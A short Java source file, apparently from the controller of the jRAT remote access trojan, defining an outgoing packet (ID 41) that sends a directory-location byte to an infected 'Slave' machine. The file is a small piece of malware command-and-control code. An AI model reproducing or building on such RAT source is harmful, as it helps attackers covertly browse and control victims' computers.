package jrat.controller.packets.outgoing;

import jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet41SpecialDirectory extends AbstractOutgoingPacket {

	private int location;

	public Packet41SpecialDirectory(int location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeByte(location);
	}

	@Override
	public short getPacketId() {
		return 41;
	}

}
